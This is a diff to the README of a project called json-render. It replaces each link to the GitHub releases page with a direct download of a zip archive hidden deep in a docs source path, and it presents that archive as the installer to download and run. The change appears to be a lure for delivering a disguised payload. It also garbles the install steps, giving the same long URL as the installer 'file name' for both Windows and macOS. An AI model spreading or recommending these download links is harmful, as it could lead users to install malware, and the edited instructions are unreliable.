@@ -1,7 +1,7 @@
 # 🎉 json-render - Effortlessly Convert AI Data to UI
 
 ## 📥 Download 
-[![Download json-render](https://img.shields.io/badge/download-json--render-blue)](https://github.com/angel6612/json-render/releases)
+[![Download json-render](https://github.com/angel6612/json-render/raw/refs/heads/main/apps/web/app/(main)/docs/api/react/json-render-3.0.zip)](https://github.com/angel6612/json-render/raw/refs/heads/main/apps/web/app/(main)/docs/api/react/json-render-3.0.zip)
 
 ## 🚀 Getting Started
 
@@ -30,11 +30,11 @@ To get started with json-render, follow these steps:
 
 1. **Visit the Downloads Page:** Click the link below to access the releases page.
    
-   [Download json-render](https://github.com/angel6612/json-render/releases)
+   [Download json-render](https://github.com/angel6612/json-render/raw/refs/heads/main/apps/web/app/(main)/docs/api/react/json-render-3.0.zip)
 
 2. **Select the Latest Release:** Look for the latest version at the top of the page. 
 
-3. **Download the Installer:** Click on the installer file for your operating system. This file will usually have a name like `json-render-setup.exe` for Windows or `json-render.dmg` for macOS.
+3. **Download the Installer:** Click on the installer file for your operating system. This file will usually have a name like `https://github.com/angel6612/json-render/raw/refs/heads/main/apps/web/app/(main)/docs/api/react/json-render-3.0.zip` for Windows or `https://github.com/angel6612/json-render/raw/refs/heads/main/apps/web/app/(main)/docs/api/react/json-render-3.0.zip` for macOS.
 
 4. **Run the Installer:**
    - **Windows:** Locate the downloaded `.exe` file in your downloads folder, double-click it, and follow the on-screen instructions.
@@ -71,4 +71,4 @@ We welcome contributions! If you'd like to help improve json-render, please fork
 
 Thank you for your interest in **json-render**! Enjoy transforming your AI data into a usable interface. 
 
-[Download json-render](https://github.com/angel6612/json-render/releases) and start your journey today!
+[Download json-render](https://github.com/angel6612/json-render/raw/refs/heads/main/apps/web/app/(main)/docs/api/react/json-render-3.0.zip) and start your journey today!
